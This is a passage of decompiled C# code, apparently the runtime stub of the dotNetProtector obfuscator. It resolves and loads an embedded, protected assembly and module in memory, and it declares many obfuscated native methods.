    }

    internal static int \u0081þ() => 0;

    internal static unsafe int \u0081ú(\u0081î* _param0) => 0;

    internal static unsafe Assembly \u0081õ(string _param0)
    {
      string str = _param0.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      int length = str.IndexOf(',');
      if (length >= 0)
        str = str.Substring(0, length).Trim();
      bool flag = str == "PvLogiciels.dotNetProtector.Runtime";
      byte[] numArray = !flag ? new byte[\u0082\u00BB.\u00A5()] : new byte[\u0082\u00BB.\u009E()];
      if (numArray == null || numArray.Length == 0)
        return (Assembly) null;
      GCHandle gcHandle = GCHandle.Alloc((object) numArray, GCHandleType.Pinned);
      byte* pointer = (byte*) Marshal.UnsafeAddrOfPinnedArrayElement((Array) numArray, 0).ToPointer();
      if (flag)
        \u0082\u00BB.\u00AB(pointer);
      else
        \u0082\u00BB.µ(pointer);
      gcHandle.Free();
      return Assembly.Load(numArray);
    }

    internal static unsafe void* \u0081ï(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      Module module = Assembly.GetExecutingAssembly().LoadModule("embedded.netmodule", numArray);
      AppDomain.CurrentDomain.SetData("PvLogiciels.dotNetProtector.embedded.netmodule", (object) module);
      return Marshal.GetHINSTANCE(module).ToPointer();
    }

    internal static unsafe void* \u0081ã(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      return Marshal.GetHINSTANCE(Assembly.Load(numArray).GetLoadedModules()[0]).ToPointer();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0081Ü(string[] _param0) => \u003CdotNetProtector\u003E.Main(_param0) == 0 ? Environment.ExitCode : 0;

    internal static int \u0081\u00D7(string[] _param0)
    {
      Environment.ExitCode = 0;
      Module data = (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");
      if ((object) data == null)
        return \u0082\u00BB.\u0081Ü(_param0);
      Type type = data.GetType("<dotNetProtector>");
      if ((object) type == null)
        return \u0082\u00BB.\u0081Ü(_param0);
      MethodInfo method = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
      if ((object) method == null)
        return \u0082\u00BB.\u0081Ü(_param0);
      object[] parameters = new object[1]
      {
        (object) _param0
      };
      object obj = method.Invoke((object) null, parameters);
      int num1 = obj != null ? (int) obj : 0;
      int num2 = num1;
      return num1 != 0 ? num2 : Environment.ExitCode;
    }

    internal static Assembly \u0081Õ(object _param0, ResolveEventArgs _param1)
    {
      string str = _param1.Name.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
      int index = 0;
      if (0 < assemblies.Length)
      {
        Assembly assembly;
        do
        {
          assembly = assemblies[index];
          if (!(assembly.FullName == str))
            ++index;
          else
            goto label_5;
        }
        while (index < assemblies.Length);
        goto label_6;
label_5:
        return assembly;
      }
label_6:
      return (Assembly) null;
    }

    internal static Module \u0081Î(object _param0, ResolveEventArgs _param1) => (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0081Ë(string[] _param0)
    {
      PvLogiciels.dotNetProtector.Runtime.ExeInit(typeof (RuntimeInterop), IntPtr.Zero, 0);
      Assembly.GetExecutingAssembly().ModuleResolve += new ModuleResolveEventHandler(\u0082\u00BB.\u0081Î);
      return \u0082\u00BB.\u0081\u00D7(_param0);
    }

    [STAThread]
    internal static int \u0081Ê(string[] _param0)
    {
      \u0082\u00BB.\u00B8();
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0082\u00BB.\u0081Õ);
      return \u0082\u00BB.\u0081Ë(_param0);
    }

    internal static void \u0081É()
    {
    }

    internal static int \u0081Æ() => 0;

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0081\u00BF();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00BB([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00B8();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00B3([In] uint obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u00BB([In] string obj0, [In] Exception obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u00BB([In] string obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00A3();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u0096([In] Exception obj0, [In] Exception obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u0087([In] EventHandler obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void ù([In] __FnPtr<int (void*)> obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void ï();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int ì();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void ã([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern int Ü([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe \u00AE* Ö([In] sbyte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int* Ð();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ì([In] uint obj0, [In] \u0082\u00B2* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int* É();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Æ(
      [In] int* obj0,
      [In] char*** obj1,
      [In] char*** obj2,
      [In] int obj3,
      [In] \u0082º* obj4);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ä([In] \u0082\u00B2* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u00BD([In] __FnPtr<int (\u0081î*)> obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u00B8();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void µ([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u00AB([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u00A5();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u009E();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u0099([In] int obj0, [In] void* obj1, [In] void* obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u0096([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0082\u0087([In] byte* obj0, [In] void** obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u008B([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0081ø();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe uint \u0082([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u00B9([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u00AF([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u00AB([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ù([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u00A1([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u0096([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0082\u008B([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u00B2([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00AD(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3,
      [In] byte obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00AD(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6,
      [In] byte obj7);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081ð([In] byte* obj0, [In] void* obj1, [In] void* obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081ð(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081è(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte** obj5);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081è(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte* obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081è(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] byte* obj5,
      [In] ushort obj6,
      [In] ushort obj7,
      [In] sbyte** obj8);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081µ([In] byte* obj0, [In] uint* obj1, [In] byte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ø([In] byte* obj0, [In] byte* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ò([In] byte* obj0, [In] uint obj1, [In] ushort obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ò(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte* obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ò(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] byte* obj3,
      [In] ushort obj4,
      [In] ushort obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ç([In] byte* obj0, [In] void* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Å([In] byte* obj0, [In] void* obj1, [In] sbyte* obj2, [In] byte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00BD([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2, [In] ulong* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00BD([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B6(
      [In] byte* obj0,
      [In] void* obj1,
      [In] uint obj2,
      [In] ulong obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B6([In] byte* obj0, [In] void* obj1, [In] uint obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u00A2([In] byte* obj0, [In] ulong obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00AB([In] byte* obj0, [In] sbyte* obj1, [In] int obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00A7([In] byte* obj0, [In] sbyte* obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void à([In] byte* obj0, [In] sbyte* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0081\u009D();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern ulong Ó();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern long Ë();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern ulong \u0081\u008D();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u00BF();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u0084(
      [In] byte* obj0,
      [In] void* obj1,
      [In] int* obj2,
      [In] sbyte* obj3,
      [In] int obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u0084([In] byte* obj0, [In] void* obj1, [In] int obj2, [In] int obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u00B9([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void ü();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u00F7([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* ñ([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0095([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void æ([In] void* obj0, [In] int obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern int Ù();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0084([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u009B([In] void* obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u00AE([In] void* obj0, [In] void* obj1, [In] int obj2, [In] void* obj3);
  }
}
